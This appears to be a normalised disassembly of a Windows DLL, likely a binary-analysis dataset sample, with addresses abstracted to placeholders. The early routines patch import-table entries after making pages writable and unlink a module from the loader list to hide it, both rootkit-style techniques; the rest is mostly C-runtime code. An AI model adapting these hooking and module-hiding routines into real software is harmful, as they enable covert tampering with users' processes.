call [ GetProcAddress@IAT ]
mov [ ebp - 0x2c ] eax
mov esi [ ebx + 0x10 ]
mov eax [ ebp - 0x1c ]
shl eax 0x2
add esi eax
add esi [ ebp + 0x8 ]
and [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x24 ]
push eax
push 0x40
push 0x4
push esi
call edi
mov eax [ ebp - 0x2c ]
mov [ esi ] eax
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x24 ]
add eax esi
add eax 0x2
push eax
push [ rw-data ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x2c ] eax
mov esi [ ebx + 0x10 ]
mov eax [ ebp - 0x1c ]
shl eax 0x2
add esi eax
add esi [ ebp + 0x8 ]
and [ ebp - 0x20 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x40
push 0x4
push esi
call edi
mov eax [ ebp - 0x2c ]
mov [ esi ] eax
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x1c ]
shl eax 0x2
mov ecx [ ebp - 0x28 ]
mov eax [ eax + ecx ]
test eax eax
je r-xdata
push 0x4
push esi
call edi
inc [ ebp - 0x1c ]
mov esi [ ebp + 0x8 ]
jmp r-xdata
sub_1000a935
push 0x2c
push r--data
call sub_10011ecc
mov eax [ rw-data ]
cmp eax 0x6
jne r-xdata
cmp eax 0x5
jne r-xdata
cmp [ rw-data ] 0x1
je r-xdata
call sub_10011f11
retn 0x4
cmp [ rw-data ] 0x1
jne r-xdata
xor esi esi
mov [ ebp - 0x4 ] esi
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov edi eax
push esi
push 0x18
lea eax [ ebp - 0x3c ]
push eax
push esi
call [ GetCurrentProcess@IAT ]
push eax
call edi
cmp eax esi
jl r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x38 ]
mov edi [ eax + 0xc ]
add edi 0xc
mov esi [ edi ]
mov eax [ esi + 0x60 ]
mov ebx [ esi + 0x64 ]
mov esi [ esi ]
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + 0x18 ]
cmp ecx [ ebp + 0x8 ]
jne r-xdata
mov [ ebp - 0x24 ] esi
cmp esi edi
je r-xdata
mov eax [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
sub_1000a9eb
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x92c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x928 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor ebx ebx
push 0xff
lea eax [ esp + 0x835 ]
push ebx
push eax
mov [ esp + 0x83c ] bl
call sub_1000b660
add esp 0xc
push 0x100
lea eax [ esp + 0x834 ]
push eax
push [ esi ]
call [ GetModuleFileNameA@IAT ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edi [ esi ]
call [ eax + 0xc ]
mov ecx edi
mov [ esp + 0x10 ] eax
call sub_1000312e
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi [ GetCurrentProcess@IAT ]
push ebx
mov [ esp + 0x18 ] eax
push 0x18
lea eax [ esp + 0x20 ]
push eax
push ebx
call esi
push eax
call [ esp + 0x28 ]
test eax eax
jl r-xdata
push edi
call sub_1000a935
push edi
call [ FreeLibrary@IAT ]
push r--data
call [ LoadLibraryW@IAT ]
mov eax [ esp + 0x10 ]
push ebx
push ebx
push ebx
push sub_10003a4c
push ebx
push ebx
mov [ rw-data ] eax
call [ CreateThread@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ eax + 0xc ]
add ecx 0xc
mov eax [ ecx ]
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
push 0x7fc
lea eax [ esp + 0x38 ]
push ebx
push eax
mov [ esp + 0x3c ] ebx
call sub_1000b660
add esp 0xc
lea eax [ esp + 0x14 ]
push eax
push 0x800
lea eax [ esp + 0x38 ]
push eax
mov [ esp + 0x20 ] ebx
call esi
push eax
call EnumProcessModules
test [ esp + 0x14 ] 0xfffffffc
mov [ esp + 0x10 ] ebx
jbe r-xdata
push eax
call [ CloseHandle@IAT ]
cmp eax ecx
jne r-xdata
push edi
call sub_1000a935
jmp r-xdata
mov eax [ esp + 0x10 ]
push [ esp + eax * 4 + 0x30 ]
call sub_1000a7f3
mov eax [ esp + 0x10 ]
mov ecx [ esp + eax * 4 + 0x30 ]
call sub_1000a6ff
mov eax [ esp + 0x14 ]
inc [ esp + 0x10 ]
shr eax 0x2
cmp [ esp + 0x10 ] eax
jb r-xdata
cmp [ eax + 0x18 ] edi
jne r-xdata
mov eax [ eax ]
xor edx edx
inc edx
mov [ eax + 0x38 ] dx
sub_1000ab60
push ebp
mov ebp esp
sub esp 0x808
push ebx
push esi
push edi
push 0x4
push 0x1000
push 0x8
xor edi edi
push edi
call [ VirtualAlloc@IAT ]
push [ ebp + 0x8 ]
mov ebx eax
call [ GetModuleHandleW@IAT ]
push 0x14
mov [ ebp - 0x8 ] eax
call sub_1000b786
pop ecx
cmp eax edi
je r-xdata
xor esi esi
mov [ eax ] r--data
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
push edi
push edi
mov [ ebx ] eax
mov [ ebx + 0x4 ] esi
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0xc ]
mov ecx sub_1000a9eb
sub ecx [ ebp - 0x8 ]
add eax ecx
push eax
push edi
push edi
call [ CreateThread@IAT ]
push eax
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ ebp + 0x8 ]
push [ ebp + eax * 4 - 0x808 ]
call sub_1000a7f3
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + eax * 4 - 0x808 ]
call sub_1000a6ff
mov eax [ ebp - 0x4 ]
inc [ ebp + 0x8 ]
shr eax 0x2
cmp [ ebp + 0x8 ] eax
jb r-xdata
push [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx esi
call [ eax ]
push 0x7fc
lea eax [ ebp - 0x804 ]
push edi
push eax
mov [ ebp - 0x808 ] edi
call sub_1000b660
add esp 0xc
lea eax [ ebp - 0x4 ]
push eax
push 0x800
lea eax [ ebp - 0x808 ]
push eax
mov [ ebp - 0x4 ] edi
call [ GetCurrentProcess@IAT ]
push eax
call EnumProcessModules
test [ ebp - 0x4 ] 0xfffffffc
mov [ ebp + 0x8 ] edi
jbe r-xdata
sub_1000ac80
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1000ad08 ]
jmp [ ecx * 4 + jump_table_1000ad88 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000adf4 ]
pop esi
pop edi
pop ebp
jmp sub_1000d7ba
jmp [ ecx * 4 + jump_table_1000af90 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1000ae94 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000af90 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000adf4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000af90 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000adf4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000adf4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000adf4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000af90 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000af90 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000af90 ]
sub_1000afe5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1000e343
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1000c4c6
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1000db82
mov [ esi + 0x4 ] eax
sub_1000b06c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
mov ebx [ ebp + 0x8 ]
xor esi esi
cmp ebx esi
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi esi
jne r-xdata
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000e687
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
inc ebx
push eax
inc ebx
call sub_1000e687
add esp 0x10
inc edi
inc edi
movzx eax ax
test si si
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp si ax
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
inc ebx
inc ebx
inc edi
inc edi
movzx eax ax
test si si
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
cmp si ax
je r-xdata
add eax 0x20
jmp r-xdata
sub_1000b17d
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000b06c
add esp 0xc
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
pop edi
pop esi
pop ebp
retn
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
movzx eax ax
cmp cx si
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx ax
je r-xdata
add eax 0x20
sub_1000b210
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_1000eb2e
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000e924
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_1000b28d
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push edi
push esi
call sub_1000b3ed
xor edi edi
pop ecx
cmp esi edi
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
call sub_1000e8db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
pop edi
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
sub_1000b2fd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_1000f7a0
call sub_1000b28d
add esp 0x10
pop esi
pop ebp
retn
sub_1000b31f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
mov edx eax
je r-xdata
push esi
mov esi [ ebp + 0xc ]
inc edx
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx ecx [ esi ]
mov [ edx ] cx
inc edx
inc edx
inc esi
inc esi
test cx cx
jne r-xdata
pop esi
pop ebp
retn
sub_1000b34d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
mov [ ecx ] ax
inc ecx
inc ecx
inc edx
inc edx
test ax ax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_1000b3a3
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi edi
test ecx ecx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
mov edx [ ebp + 0xc ]
test ecx ecx
je r-xdata
dec ecx
jne r-xdata
dec ecx
je r-xdata
movzx eax [ edx ]
mov [ edi ] ax
inc edi
inc edi
inc edx
inc edx
test ax ax
je r-xdata
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
sub_1000b3ed
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_1000b407
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] 0x7fffffff
call sub_10010e4d
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000e924
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000e924
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax esi
pop esi
sub_1000b4ba
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_1000e0ba
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_1000e0ba
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_10011b16
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_1000e03f
mov [ esi ] eax
add esi 0x4
push esi
call sub_1000e03f
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10011a76
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10011a76
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_1000e03f
pop ecx
mov [ rw-data ] eax
sub_1000b574
mov edi edi
push esi
push 0x4
push 0x20
call sub_10011a2a
mov esi eax
push esi
call sub_1000e03f
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_1000b5a5
push 0xc
push r--data
call sub_10011ecc
call sub_10011c55
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1000b4ba
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000b5db
mov eax [ ebp - 0x1c ]
call sub_10011f11
retn
sub_1000b5f8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
push edi
mov edi eax
je r-xdata
pop edi
pop ebx
pop ebp
retn
movzx ecx [ eax ]
test cx cx
je r-xdata
xor eax eax
movzx edx cx
sub eax ebx
cmp [ ecx ] 0x0
je r-xdata
movzx edx [ ecx ]
test dx dx
je r-xdata
mov eax edi
jmp r-xdata
inc edi
inc edi
movzx edx [ edi ]
inc eax
inc eax
test dx dx
jne r-xdata
movzx ebx [ eax + ecx ]
movzx edx dx
sub ebx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test dx dx
je r-xdata
inc ecx
inc ecx
cmp [ eax + ecx ] bx
jne r-xdata
sub_1000b660
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_10012113
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_1000b6e5
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
jmp r-xdata
movzx ecx [ esi ]
movzx eax [ edx ]
movzx edi cx
sub eax edi
je r-xdata
test cx cx
je r-xdata
pop edi
pop esi
test eax eax
jge r-xdata
inc edx
inc edx
inc esi
inc esi
jle r-xdata
or eax 0xffffffff
pop ebp
retn
pop ebp
retn
xor eax eax
inc eax
sub_1000b742
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1001226f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000b6da
pop ecx
sub_1000b786
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1000c036
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_100122c2
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_1000b769
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_100122ea
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_1000b71c
push sub_10020fba
call sub_1000b5e1
pop ecx
sub_1000b7fb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000b7eb
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000b6da
pop ecx
sub_1000b81c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_100123b0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_1000b83c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
dec [ ebp - 0x1c ]
js r-xdata
push edi
lea eax [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10010e4d
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
pop esi
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000e924
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000e924
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_1000b90f
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] 0x7fffffff
call sub_10010e4d
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
